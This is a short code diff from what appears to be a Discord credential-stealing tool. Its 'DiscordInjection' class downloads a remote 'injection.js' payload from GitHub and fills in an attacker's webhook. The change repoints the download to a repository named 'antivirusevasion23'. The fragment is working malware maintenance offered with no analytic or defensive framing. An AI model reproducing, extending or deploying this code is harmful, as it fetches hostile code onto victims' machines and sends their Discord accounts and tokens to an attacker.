@@ -1973,7 +1973,7 @@ class DiscordInjection:
     async def GetInjectionCode(self) -> str:
         try:
             async with aiohttp.ClientSession() as session:
-                async with session.get("https://raw.githubusercontent.com/justforExela/injection/main/injection.js") as response:
+                async with session.get("https://raw.githubusercontent.com/antivirusevasion23/injection/main/injection.js") as response:
                     data = await response.text()
                     return data.replace("%WEBHOOK%", webhook)
         except Exception as error:
